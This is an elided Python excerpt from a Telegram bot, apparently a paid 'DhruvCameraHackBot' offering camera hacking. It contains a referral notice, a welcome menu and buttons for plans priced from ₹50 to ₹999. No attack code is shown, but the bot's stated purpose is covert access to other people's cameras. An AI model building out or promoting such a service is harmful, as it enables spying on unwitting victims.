...
from aiogram.types import InlineKeyboardButton, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, FSInputFile
import html
        ...
        try:
            ...
            if inviter_data:
                await message.bot.send_message(
                    ...
                    f"{Emojis.USER} New user <a href='tg://user?id={message.from_user.id}'>{html.escape(message.from_user.full_name)}</a> joined using your referral link!\n\n"
...
async def show_terminal_menu(message_or_call):
    ...
    text = (
        ...
        "└════════════════┘</code>\n\n"
        f"{Emojis.HAMSA} <b>Welcome to advanced and powerful DhruvCameraHackBot designed for penetrating and educational purpose.</b>\n\n"
...
def get_plans_kb(with_back=True):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Starter Plan (₹50)", url="https://t.me/Rytce", icon_custom_emoji_id=Emojis.get_id(Emojis.DIAMOND)))
    builder.row(InlineKeyboardButton(text="Pro Plan (₹200)", url="https://t.me/Rytce", icon_custom_emoji_id=Emojis.get_id(Emojis.DIAMOND)))
    builder.row(InlineKeyboardButton(text="Ultra Plan (₹350)", url="https://t.me/Rytce", icon_custom_emoji_id=Emojis.get_id(Emojis.DIAMOND)))
    builder.row(InlineKeyboardButton(text="Ultimate Plan (₹999)", url="https://t.me/Rytce", icon_custom_emoji_id=Emojis.get_id(Emojis.KING)))
    if with_back:
